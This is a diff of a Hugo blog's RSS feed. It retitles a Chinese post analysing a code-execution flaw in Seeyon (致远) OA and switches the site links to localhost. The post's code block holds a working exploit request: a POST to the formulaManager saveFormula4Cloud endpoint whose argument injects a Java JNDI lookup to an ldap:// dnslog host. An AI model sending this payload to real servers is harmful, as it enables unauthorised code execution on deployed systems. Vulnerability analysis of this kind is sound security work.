@@ -1,16 +1,16 @@
 <rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
     <channel>
         <title>All Posts - raindrop blog</title>
-        <link>https://Rain1er.github.io/posts/</link>
+        <link>http://localhost:1313/posts/</link>
         <description>All Posts | raindrop blog</description>
-        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 14 Apr 2025 16:32:54 &#43;0800</lastBuildDate><atom:link href="https://Rain1er.github.io/posts/" rel="self" type="application/rss+xml" /><item>
-    <title>Seeyon代码执行</title>
-    <link>https://Rain1er.github.io/posts/seeyon%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</link>
+        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 14 Apr 2025 16:32:54 &#43;0800</lastBuildDate><atom:link href="http://localhost:1313/posts/" rel="self" type="application/rss+xml" /><item>
+    <title>致远oa代码执行</title>
+    <link>http://localhost:1313/posts/%E8%87%B4%E8%BF%9Coa%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</link>
     <pubDate>Mon, 14 Apr 2025 16:32:54 &#43;0800</pubDate><author>
-        <name>Author</name>
-    </author><guid>https://Rain1er.github.io/posts/seeyon%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</guid>
+        <name>枕雨</name>
+    </author><guid>http://localhost:1313/posts/%E8%87%B4%E8%BF%9Coa%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</guid>
     <description><![CDATA[<p>看到别人发出来了，分析一下。</p>
-<div class="code-block highlight is-closed show-line-numbers  tw:group tw:my-2">
+<div class="code-block highlight is-open show-line-numbers  tw:group tw:my-2">
   <div class="
     
     tw:flex 
@@ -99,9 +99,9 @@
       tw:overflow-y-hidden
       tw:overflow-x-auto
       tw:scrollbar-thin
-      "><pre tabindex="0"><code>POST /seeyon/ajax.do?method=ajaxAction&amp;managerName=formulaManager&amp;managerMethod=saveFormula4Cloud
-
-arguments={&#34;formulaName&#34;:&#34;test&#34;,&#34;formulaType&#34;:&#34;2&#34;,&#34;sample&#34;:&#34;javax.naming.InitialContext initialContext = new javax.naming.InitialContext().lookup(\&#34;ldap://test.pjchi0.dnslog.cn\&#34;);&#34;}</code></pre></code></pre>
+      "><span class="line"><span class="cl">POST /seeyon/ajax.do?method=ajaxAction&amp;managerName=formulaManager&amp;managerMethod=saveFormula4Cloud
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">arguments={&#34;formulaName&#34;:&#34;test&#34;,&#34;formulaType&#34;:&#34;2&#34;,&#34;sample&#34;:&#34;javax.naming.InitialContext initialContext = new javax.naming.InitialContext().lookup(\&#34;ldap://test.pjchi0.dnslog.cn\&#34;);&#34;}</span></span></code></pre>
 </div>
 <h2 id="漏洞分析" class="headerLink">
     <a href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90" class="header-mark"></a>漏洞分析</h2><h3 id="路由" class="headerLink">
